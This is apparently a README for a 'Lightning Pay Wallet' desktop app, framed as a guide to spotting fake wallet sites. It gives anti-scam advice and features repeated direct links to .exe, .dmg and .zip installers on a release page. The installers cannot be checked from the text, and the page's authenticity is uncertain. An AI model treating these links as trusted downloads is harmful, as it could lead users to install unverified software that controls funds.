<p align="center"><img src="assets/banner-article.png" alt="Lightning Pay Wallet"></p>

# Spotting a fake Lightning Pay website or installer

One rule resolves most of it: the release page or nothing.

<p align="center"><a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-windows-v1.2.1.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-0350c2?style=for-the-badge&logo=data:image/svg%2Bxml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD Windows"></a> <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-macos-v1.2.1.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-0350c2?style=for-the-badge&logo=apple&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD macOS"></a> <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-linux-v1.2.1.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-0350c2?style=for-the-badge&logo=linux&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| ![Windows](https://img.shields.io/badge/platform-Windows-fed023?style=flat-square&logo=data:image/svg%2Bxml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=ffffff&labelColor=091640) | Windows 10 (1909) or later, 64-bit | <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-windows-v1.2.1.exe">lightning-pay-wallet-windows-v1.2.1.exe</a> |
| ![macOS](https://img.shields.io/badge/platform-macOS-fed023?style=flat-square&logo=apple&logoColor=ffffff&labelColor=091640) | macOS 12 or later | <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-macos-v1.2.1.dmg">lightning-pay-wallet-macos-v1.2.1.dmg</a> |
| ![Linux](https://img.shields.io/badge/platform-Linux-fed023?style=flat-square&logo=linux&logoColor=ffffff&labelColor=091640) | x64, Ubuntu 20.04 or later, or equivalent | <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-linux-v1.2.1.zip">lightning-pay-wallet-linux-v1.2.1.zip</a> |

</div>

Every file above is published on <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/tag/v1.2.1">the Lightning Pay Wallet release page</a> under the same names, and that page is the only place the installers should come from.

> **Only download from this GitHub release page.**

Wallet scams do not need to break cryptography. They need one person to install the wrong file or type
a phrase into the wrong page. Both are preventable with checks that take seconds.

## The download rule

The only official installers are attached to the release on the app repository. Every page on this site
links there, and the file names on that page are the file names you should see.

A download from anywhere else is not this product: not an ad, not a mirror, not a "direct download"
button, not a site that ranks above the repository in search. If the link does not go to
`github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases`, stop.

## The phrase rule

No legitimate wallet, update, support agent or verification page ever asks for your recovery phrase.
Not to "validate" it, not to "sync" it, not to "unlock" a bonus. A page that asks is collecting
wallets, and what happens next is immediate.

The same applies to a person in a chat offering to help: there is no support process for a
non-custodial wallet that needs the phrase.

## Other signals

A site that promises returns, airdrops or a card upgrade in exchange for a deposit. A build that asks
for remote access. An installer that wants to disable security software. An update notification that
did not come from inside the application.

Individually each is suspicious. Together they describe the same pattern: create urgency, ask for the
secret, take the funds.

## If you already installed something wrong

Disconnect the machine from the network. Move any funds that are still reachable to a wallet you
created from a clean install. Treat the phrase as compromised and create a new one; changing it is
cheap, discovering it later is not.

## Checking a link before you click

Read the domain, not the page design. Look at the path: a release download has `/releases/download/`
in it. Compare the file name against the release page. Three seconds of reading beats a reinstall.

## Questions people ask

### Is the site with the card offer official?

The card belongs to the product line; the desktop build does not issue one. A site demanding a deposit
to unlock it is not official.

### Can a fake installer steal a wallet that has no balance?

It can capture the phrase at creation, which is worse: it gets the wallet you will fund later.

### Does the wallet ever email me?

There is no account and no email list tied to a wallet. An email asking you to "verify your wallet" is
not from here.

## Related guides

- <a href="https://github.com/bitcoin-lightning-wallet/wallet-recovery-guides/blob/HEAD/is-lightning-pay-legit.md">Is Lightning Pay legit and safe? What the record actually shows</a>
- <a href="https://github.com/bitcoin-lightning-wallet/lightning-wallet-basics/blob/HEAD/download-lightning-pay-windows-macos.md">Downloading Lightning Pay on Windows and macOS without getting a fake</a>
- <a href="https://github.com/bitcoin-lightning-wallet/wallet-recovery-guides/blob/HEAD/what-lightning-pay-wallet-is.md">What Lightning Pay Wallet is, and what it is not</a>

